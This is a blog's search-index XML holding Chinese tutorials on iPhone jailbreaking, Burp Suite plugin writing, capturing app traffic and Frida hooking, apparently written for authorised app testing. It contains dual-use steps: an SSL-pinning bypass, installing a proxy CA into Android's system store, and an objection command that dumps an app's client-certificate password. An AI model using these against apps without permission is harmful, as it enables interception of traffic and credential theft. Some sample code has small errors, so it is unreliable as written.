<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>苹果的越狱之路</title>
    <url>/2021/07/19/%E8%8B%B9%E6%9E%9C%E7%9A%84%E8%B6%8A%E7%8B%B1%E4%B9%8B%E8%B7%AF/</url>
    <content><![CDATA[<h1 id="苹果的越狱之路"><a href="#苹果的越狱之路" class="headerlink" title="苹果的越狱之路"></a>苹果的越狱之路</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>下周有ios App要测试，公司新购入了2台iphone6s 用来测试，越狱这个任务就交到我了头上。这玩意之前只听过，自己也没做过（之前穷的很，没钱买苹果手机）。买之前还特地吩咐过注意看哪些系统可以越狱，当时我以为只要越狱了就能降级。（越狱了也不一定能降级，高版本的ios都是未完全越狱，重启后就失效的那种）一台是14.2的系统，另一台是11.2.1的系统。于是开启了越狱之路</p>
<a id="more"></a>
<h2 id="0x01-越狱之路"><a href="#0x01-越狱之路" class="headerlink" title="0x01 越狱之路"></a>0x01 越狱之路</h2><p>两台越狱都挺简单的，but在安装插件的时候出了很多问题。</p>
<h3 id="11-2-1的系统"><a href="#11-2-1的系统" class="headerlink" title="11.2.1的系统"></a>11.2.1的系统</h3><ol>
<li>使用windows版本的爱思助手，直接一键越狱，之后会在手机上安装unc0ver，需要手动去设置-&gt;通用-&gt;设备管理，信任xxx，如图。<br>76084DB9-2303-4f71-BB1F-D8303AB0857E.png<img src="/pic/upload_dcc77f6505c2b17c5705f96408bba8df.png" alt=""></li>
</ol>
<ol start="2">
<li><p>越狱之后安装必要的插件，先是打开cydia软件出现网络无法访问，根据爱思助手的帮助找到了<a href="https://m.i4.cn/channels/apps/app_content.html?id=269617" target="_blank" rel="noopener">教程</a>。</p>
</li>
<li><p>下载乐网后，开启劫持会出现一个vpn选项，随后cydia成功联网。</p>
<blockquote>
<p>得知原因是系统没给cydia开启联网权限</p>
</blockquote>
</li>
<li><p>下载acf2，appsync，opensh，frida等插件，但是这个过程中又出现了错误，能下载成功但是安装的时候报错<code>Sub - process /usr/libexec/cydia/cydo returned an error code (2).</code>安装所有插件都是如此。怀疑可能cydia的问题，随后又下载了很多中越狱软件比如unc0ver，再重启使越狱失效后，用unc0ver重新越狱，发现还是同样的问题。</p>
</li>
<li><p>重置设备，重新越狱。重复上诉1，2，3操作。又到了下载插件的过程，但是这次报错的是<code>Dpkg locked</code>，根据<a href="https://www.cydiaos.com/fix-cydia-dpkg-was-interrupted-error/" target="_blank" rel="noopener">教程</a>，说要删除dpkg目录下的所有000，111开头的文件。使用i4助手的打开ssh通道（有时能用有时候提示要安装openssh，但是有时候没安装也能开）进入了ios的shell。进去之后发现<code>/var</code>下居然没有lib目录！！！！</p>
</li>
<li><p>谨慎的把设备升级到14.2，毕竟升级之后就降不回去了。</p>
</li>
</ol>
<h3 id="14-2的系统"><a href="#14-2的系统" class="headerlink" title="14.2的系统"></a>14.2的系统</h3><ol>
<li><p>使用爱思助手发现还不支持，其实是爱思助手还没更新，最新的<a href="https://checkra.in/" target="_blank" rel="noopener">checkra1n</a>-0.12.1已经支持了。下载下来打开</p>
<p>截屏2020-12-31 下午5.52.08.png<img src="/pic/upload_7c6661ad6d48e2997226050560b74a56.png" alt=""></p>
</li>
</ol>
<p>截屏2020-12-31 下午6.14.35.png<img src="" alt="Uploading file..._0hs4esayu"></p>
<ol start="2">
<li><p>usb连接ios设备，如果支持，start按钮会变成可点击的。然后点击start进入下一个界面，点击next。随后设备会进入恢复模式。</p>
<p>截屏2020-12-31 下午6.14.35.png<img src="/pic/upload_7c25aaadf3a8428e11ecac1c44788d3e.png" alt=""></p>
</li>
</ol>
<ol start="3">
<li>点击start，然后按住home键和电源键，等待第一次计时结束，松开电源键，继续按着home键，等待进入一个出现进度条的页面就可以松开了。就已经开始安装了，等进度条结束就已经越狱完成。 <pre><code>截屏2020-12-31 下午6.16.04.png![](/pic/upload_3ead2c8f60d0594b69037856d46a5bf5.png)</code></pre></li>
</ol>
<ol start="4">
<li><p>打开cydia，添加软件源，frida 对应的源是 <a href="https://build.frida.re" target="_blank" rel="noopener">https://build.frida.re</a> ，appsync对应的软件源是<a href="https://apt.pandahelp.vip，点开搜索frida。选择frida" target="_blank" rel="noopener">https://apt.pandahelp.vip，点开搜索frida。选择frida</a> for pre-a12 （6s是a9所以选择A12以前的），然后搜索appsync  安装appsync unifies for ios 14，搜索afc2，会出现一个pandahelper源的，还会有一个bigboss的，选择bigboss的，如果选择了pandahelper会导致无法连接爱思助手，其他暂时测试无影响。</p>
</li>
<li><p>电脑上打开frida-ps -U测试连接,出现如下结果，说明frida正常连接成功。</p>
   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> frida-ps -U   </span><br><span class="line">PID  Name</span><br><span class="line">---  --------------------------------------------------------</span><br><span class="line">207  Cydia</span><br><span class="line">192  Siri搜索</span><br><span class="line">870  相机</span><br><span class="line">839  设置</span><br><span class="line">119  ACCHWComponentAuthService</span><br><span class="line">863  ASPCarryLog</span><br><span class="line"> 41  AppleCredentialManagerDaemon</span><br><span class="line">868  AssetCacheLocatorService</span><br><span class="line">131  BlueTool</span><br><span class="line">180  CAReportingService</span><br><span class="line">511  CMFSyncAgent</span><br><span class="line">560  CacheDeleteAppContainerCaches</span><br><span class="line">568  CacheDeleteExtension</span><br><span class="line">480  CategoriesService</span><br><span class="line">267  CategoriesService</span><br><span class="line">226  CategoriesService</span><br><span class="line">224  CategoriesService</span><br><span class="line">122  CloudKeychainProxy</span><br><span class="line">......</span><br></pre></td></tr></table></figure>


</li>
</ol>
<p>至此，可以顺利使用frida进行hook操作。</p>
<h2 id="0x02-参考链接"><a href="#0x02-参考链接" class="headerlink" title="0x02 参考链接"></a>0x02 参考链接</h2><p><a href="https://www.cydiaos.com/fix-cydia-dpkg-was-interrupted-error/" target="_blank" rel="noopener">https://www.cydiaos.com/fix-cydia-dpkg-was-interrupted-error/</a><br><a href="https://checkra.in" target="_blank" rel="noopener">https://checkra.in</a><br><a href="https://m.i4.cn/channels/apps/app_content.html?id=269617" target="_blank" rel="noopener">https://m.i4.cn/channels/apps/app_content.html?id=269617</a><br><a href="https://www.i4.cn/news_detail_18849.html" target="_blank" rel="noopener">https://www.i4.cn/news_detail_18849.html</a></p>
]]></content>
  </entry>
  <entry>
    <title>burp_plugin开发</title>
    <url>/2021/03/30/burp_plugin%E5%BC%80%E5%8F%91/</url>
    <content><![CDATA[<h1 id="burp-plugin开发"><a href="#burp-plugin开发" class="headerlink" title="burp_plugin开发"></a>burp_plugin开发</h1><h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><p>由于测试app，需要用到brida，brida的高级功能需要动手写js+bp插件，还是需要单独编写的burp插件，很早就知道burp可以用py开发插件，但从前都是拿来主义（现在也是），毕竟白嫖的不香嘛？但是独立的bp插件又不能都让其他的师傅帮忙，于是就有了此篇文章。</p>
<a id="more"></a>
<h2 id="0x01-基础"><a href="#0x01-基础" class="headerlink" title="0x01 基础"></a>0x01 基础</h2><p>首先是打开burp的插件官网去看看，上面写的介绍<br><a href="https://portswigger.net/burp/extender/writing-your-first-burp-suite-extension" target="_blank" rel="noopener">编写你的第一个burp插件</a><br>里面的写法和java很像，都是写一个类。<br>文中给出了一个可以正常导入而不会报错的一个例子</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from burp import IBurpExtender</span><br><span class="line">class BurpExtender(IBurpExtender):</span><br><span class="line">    def registerExtenderCallbacks( self, callbacks):</span><br><span class="line">    # your extension code here</span><br><span class="line">        return</span><br></pre></td></tr></table></figure>
<p>于是跟着这个例子和文中提到的其他接口写出了自己的第一个demo</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from burp import IBurpExtender</span><br><span class="line">from java.io import PrintWriter</span><br><span class="line"></span><br><span class="line">class BurpExtender(IBurpExtender):</span><br><span class="line">    def registerExtenderCallbacks( self, callbacks):</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">        stdout &#x3D; PrintWriter(callbacks.getStdout(), True) #取得标准输出流</span><br><span class="line">        stderr &#x3D; PrintWriter(callbacks.getStderr(), True) #取得标准错误流</span><br><span class="line">        callbacks.setExtensionName(&quot;demo1&quot;) #burp插件命名语句</span><br><span class="line">        </span><br><span class="line">        stdout.println(&quot;Hello My first demo!&quot;)</span><br><span class="line">        return</span><br></pre></td></tr></table></figure>
<h1 id="0x02-尝试改写repeate模块的请求"><a href="#0x02-尝试改写repeate模块的请求" class="headerlink" title="0x02 尝试改写repeate模块的请求"></a>0x02 尝试改写repeate模块的请求</h1><p>尝试改写repeate发送的数据</p>
<ol>
<li>先需要在<code>registerExtenderCallbacks</code>注册一个HttpListener，否则无法调用<code>processHttpMessage</code>函数<br>注册代码<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">registerExtenderCallbacks</span><span class="params">( self, callbacks)</span>:</span></span><br><span class="line">   self._helpers = callbacks.getHelpers()</span><br><span class="line">   self._callbacks = callbacks</span><br><span class="line">   callbacks.setExtensionName(<span class="string">"demo2"</span>)  <span class="comment"># burp插件命名语句</span></span><br><span class="line">   callbacks.registerHttpListener(self) <span class="comment">#注册HttpListener</span></span><br></pre></td></tr></table></figure></li>
<li>注册完之后需要调用的函数<br><img src="/pic/upload_ea0bcbe647e20197a0e864591322e177.png" alt=""><br>toolFlag的定义在这<br><img src="/pic/upload_d3ffa0b0200f7848b069d0270430537f.png" alt=""><br>用来标记来自burp的哪一个模块，如下代码是只处理来自repeate模块的请求，如果需要处理其他模块的数据包，就在添加几个or if即可。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):</span><br><span class="line">        if toolFlag &#x3D;&#x3D; self._callbacks.TOOL_REPEATER:  #处理来自repeate的包</span><br></pre></td></tr></table></figure></li>
<li>然后是messageIsRequest参数，用来标记是否发送了请求，发送了就是true</li>
<li>messageInfo参数是需要处理的整个请求的的对象<br>查看messageInfo对象可调用参数<br><img src="/pic/upload_61c34a41aa97972535616fb8084e581d.png" alt=""></li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getRequest()  &#x2F;&#x2F;获取请求的完整信息，返回参数是byte类型</span><br><span class="line">getHttpService()  &#x2F;&#x2F;获取http服务，其中包含的参数是</span><br></pre></td></tr></table></figure>

<p><img src="/pic/upload_8d6fed5dd61b33b60aff36598fd7c50e.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setRequest()&#x2F;&#x2F;更新请求</span><br></pre></td></tr></table></figure>


<p>后续联动brida插件时还需要用到一下函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setResponse() &#x2F;&#x2F;用来修改返回的报文</span><br></pre></td></tr></table></figure>




<ol start="5">
<li>还需要用到的函数有<br>IExtensionHelpers接口下的<br><img src="/pic/upload_21f1ff8255e9f90b8cef81c0ce59446c.png" alt=""><br><img src="/pic/upload_98437ab52eeef718e040112a3f933b67.png" alt=""></li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">analyzeRequest()&#x2F;&#x2F;用来将request请求信息转化方便操作的IHttpInfo对象</span><br></pre></td></tr></table></figure>

<p>IHttpInfo接口所有的函数<br><img src="/pic/upload_ddcbf0e9cc0eb1328dcbc8602fe19807.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">buildRequest()&#x2F;&#x2F;处理完后构建新的request请求</span><br><span class="line">&#96;&#96;&#96; </span><br><span class="line"></span><br><span class="line">6. 再来说说IHttpInfo接口所包含的函数</span><br></pre></td></tr></table></figure>
<p>getBodyOffset()//函数是获取body部分的开偏移值<br>getHeaders() //获取header，如果是一个完整的GET，header就是所有的请求部分；如果是一个post请求，header+body就是整个部分。<br>getParameters() //有好几个接口都有这个函数，但是这个函数吧，不好用，也可能是没学会这个函数的用法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">完整代码如下</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from burp import IBurpExtender</span><br><span class="line">from burp import IHttpListener</span><br><span class="line"></span><br><span class="line">class BurpExtender(IBurpExtender,IHttpListener):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def registerExtenderCallbacks( self, callbacks):</span><br><span class="line">        self._helpers &#x3D; callbacks.getHelpers()</span><br><span class="line">        self._callbacks &#x3D; callbacks</span><br><span class="line">        callbacks.setExtensionName(&quot;demo2&quot;)  # burp插件命名语句</span><br><span class="line">        callbacks.registerHttpListener(self)</span><br><span class="line"></span><br><span class="line">    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):</span><br><span class="line">        if toolFlag &#x3D;&#x3D; self._callbacks.TOOL_REPEATER:  #处理来自repeate的包</span><br><span class="line">            if messageIsRequest:   #获取请求数据</span><br><span class="line">                Httpservice&#x3D;messageInfo.getHttpService()</span><br><span class="line">                para&#x3D;&#123;&#125;</span><br><span class="line">                host&#x3D;Httpservice.getHost()  #获取host</span><br><span class="line">                port&#x3D;Httpservice.getPort()  #获取端口</span><br><span class="line">                </span><br><span class="line">                raw&#x3D;messageInfo.getRequest()  #获取完整请求信息</span><br><span class="line">                analyzeraw&#x3D;self._helpers.analyzeRequest(raw)  #将完整请求转换成IRequestInfo实例</span><br><span class="line">                request_header&#x3D;analyzeraw.getHeaders()   #获取请求header</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                request_body &#x3D; raw[analyzeraw.getBodyOffset():].tostring()  #获取body</span><br><span class="line">                print(&#39; HOST:&#39;,host,&#39;\n Port: &#39;,port,&#39; \nHeader:&#39;,request_header,&#39;\nBody:&#39;,request_body)  #打印请求</span><br><span class="line"></span><br><span class="line">                request_header0&#x3D;request_header[0].split(&quot; &quot;)    #分割requestheader第一行</span><br><span class="line">                path&#x3D;request_header0[1]     #取中间的参数 &#x2F;index.php?a&#x3D;aaa</span><br><span class="line">                print(path)   #打印path</span><br><span class="line">                parastr&#x3D;path.split(&quot;?&quot;)[1]  # 取参数合集的字符串</span><br><span class="line">                paras&#x3D;parastr.split(&quot;&amp;&quot;)  #将参数用列表保存每一个参数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                paras0&#x3D;paras[0].split(&quot;&#x3D;&quot;)[0]+&quot;&#x3D;new_a&quot; #将第一个参数值替换为 new_a</span><br><span class="line"></span><br><span class="line">                request_header[0]&#x3D;request_header[0].replace(paras[0],paras0)  #在requests_header中将原参数替换为new_a</span><br><span class="line"></span><br><span class="line">                print(request_header[0]..tostring())    #打印request_header第一行</span><br><span class="line">                http&#x3D;self._helpers.buildHttpMessage(request_header,request_body) #构建新的http request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                print(http.tostring())  # 打印新的http request</span><br><span class="line">                messageInfo.setRequest(http) #用新构建的http request更新当前request</span><br></pre></td></tr></table></figure>


<p>在本地起一个php的简易服务器，传入a参数，打印a参数的值<br><img src="/pic/upload_9ba998e3b1f5006b66a9b2a30f472477.png" alt=""><br>启用后的效果<br><img src="/pic/upload_809262d9a018f70ca1dde12ea46dfd50.png" alt=""></p>
<p>下一篇文章将联合brida插件，进行自动加解密。</p>
<h1 id="0x03总结"><a href="#0x03总结" class="headerlink" title="0x03总结"></a>0x03总结</h1><p>google，百度了一便，发现直接教python编写burp的插件的文章少得可怜，讲的我也不太看的明白，只好自己去翻burp的doc。一点一点的看，一点一点的学。做开发真的没有提示很容易敲错代码，然后调试调半天，还不知道那里错了。</p>
<h1 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h1><p><a href="https://portswigger.net/burp/extender/api/" target="_blank" rel="noopener">https://portswigger.net/burp/extender/api/</a></p>
]]></content>
  </entry>
  <entry>
    <title>APP/小程序抓包</title>
    <url>/2021/03/24/APP_%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85/</url>
    <content><![CDATA[<h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><p>在测试小程序或app总会遇到抓不到包的情况，也听很多大佬说过，抓不到包使用低版本安卓。小程序比较好解决，毕竟是在微信上运行的程序，可以加的东西比较少；独立的app可以加的东西就很多了，例如添加非标准的http协议，如可自定义的的http模块okhttp；或者证书校验；独立函数校验。这就分很多中情况了。</p>
<a id="more"></a>
<h1 id="0x01-安卓7-0以上不能抓包根源"><a href="#0x01-安卓7-0以上不能抓包根源" class="headerlink" title="0x01 安卓7.0以上不能抓包根源"></a>0x01 安卓7.0以上不能抓包根源</h1><p>在 Android7.0 及以上的系统中，每个应用可以定义自己的可信 CA 集集。</p>
<p>默认情况下，应用只会信任系统预装的 CA 证书，而不会信任用户安装的 CA 证书。</p>
<p>而回想我们抓包的过程，无论是 fiddler 还是 Charles，想抓 https，都必须手机安装对应的证书，通过 fiddler/Charles 安装的证书恰恰正属于用户安装的 CA 证书，因此会被视作不安全的证书。</p>
<h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><p>把手机root，然后安装证书到系统证书目录下<br>系统证书的目录是：/system/etc/security/cacerts/</p>
<p>每个证书的命名规则为：<Certificate_Hash>.<Number></p>
<p>Certificate_Hash表示证书文件的 hash 值，Number是为了防止证书文件的 hash 值一致而增加的后缀;</p>
<p>证书的 hash 值可以由命令计算出来，在终端输入openssl x509 -subject_hash_old -in <Certificate_File>，其中Certificate_File为证书路径，将证书重命名为hash.0放入系统证书目录，之后你就可以正常抓包了。</p>
<h1 id="0x02小程序抓包"><a href="#0x02小程序抓包" class="headerlink" title="0x02小程序抓包"></a>0x02小程序抓包</h1><ol>
<li>安卓系统 7.0 以下版本，不管微信任意版本，都会信任系统提供的证书</li>
<li>安卓系统 7.0 以上版本，微信 7.0 以下版本，微信会信任系统提供的证书</li>
<li>安卓系统 7.0 以上版本，微信 7.0 以上版本，微信只信任它自己配置的证书列表<br>解决方法一：使用苹果系统<br>解决方法二：使用低版本安卓<br>解决方法三：root后安装证书到系统证书处，使用低版本微信<br>解决方法四：hook微信</li>
</ol>
<p>最简单的方法就是使用苹果系统进行抓包或者使用低版本安卓</p>
<h1 id="0x03-app无法抓包"><a href="#0x03-app无法抓包" class="headerlink" title="0x03 app无法抓包"></a>0x03 app无法抓包</h1><p>目前大多使用了各种手段以确保安全。首先要解决抓包问题，然后还要解决各种解密问题。<br>根据app对证书的处理分为以下几种方式</p>
<ol>
<li>使用自定义http模块，例如okhttp，不实现其http代理功能，或者不完整的http代理功能</li>
<li>客户端对服务器的证书做校验</li>
<li>在客户端代码层对证书做校验</li>
<li>服务器对客户端证书做校验</li>
<li>在代码层判断是否启用了vpn</li>
</ol>
<p>以上5中方法是对于http(s)的抓包，目前大多数app也都是这几种进行组合。<br>下面给出解决办法</p>
<ol>
<li><p>使用vpn软件，将所有数据包走vpn通道<br> 在bp或者其他抓包软件中设置好代理后，使用Postern输入ip，端口进行连接<br> <img src="/pic/upload_87e5e7106fcdc309a733a538e2b59408.png" alt=""><br> <img src="/pic/upload_7a16234ba09a4795d36027a875450a15.png" alt=""></p>
</li>
<li><p>将抓包软件的证书导入到系统中<br> 上面说到了如何将证书导入到系统证书中</p>
</li>
<li><p>hook校验证书的函数，使其失效（又被称为ssl pinning）<br> 使用frida，hook验证函数，也可以直接使用objection<br> <code>#android sslpinning disable</code><br> <img src="/pic/upload_12ad68db8bdd3cdd123ea918df0259c0.png" alt=""></p>
</li>
<li><p>将抓包软件导入app的证书<br> 直接抓包会出现400错误<br> <img src="/pic/upload_7de4d19f4c961863eacc726fad44a1f7.png" alt=""></p>
<p> 使用jadx反编译后，一般直接搜索client或者p12(可能有些是其他格式)就可以搜索到<br> <img src="/pic/upload_d3fb09d32bc128cc173d94917d6680f0.png" alt=""><br> 在app未启动时，使用objection抓取密码，大多数情况下可用<br> <code>#objection -g com.boqianyi.havefun explore --startup-command &#39;android hooking watch class_method  java.security.KeyStore.load --dump-args e --dump-return&#39;</code><br> <img src="/pic/upload_9ebde0412f6f3bd6c40387efb564afbd.png" alt=""><br> 然后选择对应对证书格式导入<br> <img src="/pic/upload_ae8208f5b8d992f142ece12f6f05ad04.png" alt=""><br> 最后选择证书，输入密码就可以愉快的抓包了<br> <img src="/pic/upload_bde30b9f8ee0772accb2fa7076a85966.png" alt=""></p>
</li>
<li><p>hook校验函数，使其失效 </p>
</li>
</ol>
<h1 id="0x04参考文章"><a href="#0x04参考文章" class="headerlink" title="0x04参考文章"></a>0x04参考文章</h1><p><a href="https://www.anquanke.com/post/id/197657" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197657</a><br><a href="https://testerhome.com/articles/17746" target="_blank" rel="noopener">https://testerhome.com/articles/17746</a></p>
]]></content>
  </entry>
  <entry>
    <title>再次学习docker操作</title>
    <url>/2021/03/05/%E5%86%8D%E6%AC%A1%E5%AD%A6%E4%B9%A0docker%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>hook神器FRIDA</title>
    <url>/2021/02/14/hook%E7%A5%9E%E5%99%A8FRIDA/</url>
    <content><![CDATA[<h1 id="hook神器FRIDA"><a href="#hook神器FRIDA" class="headerlink" title="hook神器FRIDA"></a>hook神器FRIDA</h1><h2 id="0x00-安装"><a href="#0x00-安装" class="headerlink" title="0x00 安装"></a>0x00 安装</h2><ol>
<li>使用python 一键安装</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install frida</span><br><span class="line">pip3 install frida-tools</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>在安卓手机上安装frida-server</p>
<p>下载地址<a href="https://github.com/frida/frida/releases" target="_blank" rel="noopener">https://github.com/frida/frida/releases</a></p>
<p>搜索frida-server，现在的手机一般都是arm64，平板是x86选择对应的版本下载</p>
<p>使用adb工具将firda-server推送到已root手机的/data/loca/tmp中（其他目录也可以，一般是使用这个目录）</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb push frida-server-14.2.7-android-arm64 /data/<span class="built_in">local</span>/tmp </span><br><span class="line">adb shell chmod +x /data/<span class="built_in">local</span>/tmp/frida-server-14.2.7-android-arm64</span><br><span class="line">adb shell /data/<span class="built_in">local</span>/tmp/frida-server-14.2.7-android-arm64</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<ol start="3">
<li>使用命令frida-ps查看是否成功链接上frida-server</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">frida-ps -U</span><br></pre></td></tr></table></figure>

<p>​        如果出现了apk的包名则表示成功连接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PID  Name</span><br><span class="line">----  -------------------------------</span><br><span class="line"> 261  adbd</span><br><span class="line">1008  android.process.media</span><br><span class="line">1656  com.android.defcontainer</span><br><span class="line">4026  com.android.documentsui</span><br><span class="line">4053  com.android.externalstorage</span><br><span class="line">1759  com.android.gallery3d</span><br><span class="line">1383  com.android.keychain</span><br><span class="line">1718  com.android.phone</span><br><span class="line">1791  com.android.settings</span><br><span class="line">1690  com.android.settings:superuser</span><br><span class="line">4081  com.android.shell</span><br><span class="line"> 743  com.android.systemui</span><br><span class="line"> 824  com.tencent.mm</span><br><span class="line">1140  com.tencent.mm:push</span><br><span class="line">	.....</span><br></pre></td></tr></table></figure>

<h2 id="0x01-基础"><a href="#0x01-基础" class="headerlink" title="0x01 基础"></a>0x01 基础</h2><p>先查看手册<a href="https://frida.re/docs/javascript-api/" target="_blank" rel="noopener">英文原版</a> <a href="https://zhuanlan.kanxue.com/article-342.htm" target="_blank" rel="noopener">中文版上</a><a href="https://zhuanlan.kanxue.com/article-414.htm" target="_blank" rel="noopener">中文版下</a></p>
<p>roysue大佬写了详细的教程</p>
<h3 id="1-hook参数修改结果"><a href="#1-hook参数修改结果" class="headerlink" title="1. hook参数修改结果"></a>1. hook参数修改结果</h3><p>例子<a href="https://github.com/11x256/frida-android-examples/tree/master/examples/1" target="_blank" rel="noopener">下载地址</a></p>
<p>先安装apk，然后启动</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//apk主要代码</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">my_activity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_my_activity);</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;       <span class="comment">//无限循环</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            fun(<span class="number">50</span>,<span class="number">30</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> x , <span class="keyword">int</span> y )</span></span>&#123;</span><br><span class="line">        Log.d(<span class="string">"Sum"</span> , String.valueOf(x+y));   <span class="comment">//打印x+y的值</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用adb命令查看程序启动时打印的x+y的值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">01-21 22:28:04.489  4910  4910 D Sum     : 80</span><br><span class="line">01-21 22:28:05.523  4910  4910 D Sum     : 80</span><br><span class="line">01-21 22:28:06.614  4910  4910 D Sum     : 80</span><br><span class="line">01-21 22:28:07.615  4910  4910 D Sum     : 80</span><br><span class="line">01-21 22:28:08.617  4910  4910 D Sum     : 80</span><br><span class="line">01-21 22:28:09.618  4910  4910 D Sum     : 80</span><br><span class="line">01-21 22:28:10.619  4910  4910 D Sum     : 80</span><br><span class="line">01-21 22:28:11.619  4910  4910 D Sum     : 80</span><br><span class="line">01-21 22:28:12.620  4910  4910 D Sum     : 80</span><br><span class="line">01-21 22:28:13.630  4910  4910 D Sum     : 80</span><br><span class="line">01-21 22:28:14.639  4910  4910 D Sum     : 80</span><br><span class="line">01-21 22:28:15.639  4910  4910 D Sum     : 80</span><br></pre></td></tr></table></figure>

<p>按照官方的手册写一段劫持的js代码,命名为demo1.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"Script loaded successfully "</span>);</span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>) </span>&#123; <span class="comment">//Java.perform(fn): ensure that the current thread is attached to the VM and call fn</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Inside java perform function"</span>);</span><br><span class="line">    <span class="comment">//添加要劫持的类</span></span><br><span class="line">    <span class="keyword">var</span> my_class = Java.use(<span class="string">"com.example.a11x256.frida_test.my_activity"</span>);</span><br><span class="line">    <span class="comment">//重写函数</span></span><br><span class="line">    my_class.fun.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">        <span class="comment">//打印函数原来的值</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"original call: fun("</span> + x + <span class="string">", "</span> + y + <span class="string">")"</span>);</span><br><span class="line">        <span class="comment">//使用2，5代替x,y返回参数</span></span><br><span class="line">        <span class="keyword">var</span> ret_value = <span class="keyword">this</span>.fun(<span class="number">2</span>, <span class="number">5</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"now call: fun(2, 5)"</span>);</span><br><span class="line">        <span class="keyword">return</span> ret_value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>使用python调用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, frida</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"./demo1.js"</span>,<span class="string">"r+"</span>) <span class="keyword">as</span> jsfile:   <span class="comment">#读取刚才写的js的内容</span></span><br><span class="line">    jscode=jsfile.read()</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()  //获取usb设备</span><br><span class="line">pid = device.spawn(<span class="string">"com.example.a11x256.frida_test"</span>)   <span class="comment">#注入apk</span></span><br><span class="line">device.resume(pid)      </span><br><span class="line">time.sleep(<span class="number">1</span>)     <span class="comment">#休眠1秒，如无此操作，部分类可能无法hook</span></span><br><span class="line">session = device.attach(pid)</span><br><span class="line">script = session.create_script(jscode)   <span class="comment">#创建脚本</span></span><br><span class="line">script.load()     <span class="comment">#加载脚本</span></span><br><span class="line"></span><br><span class="line">sys.stdin.read()  <span class="comment">#持续查看输入</span></span><br></pre></td></tr></table></figure>

<p> 当执行此脚本时，观察logcat打印的信息，发现不是打印80而是改成7了。</p>
<p>当脚本执行时</p>
<p><img src="/pic/demo1.png" alt=""></p>
<p><img src="/pic/demo1_stop.png" alt=""></p>
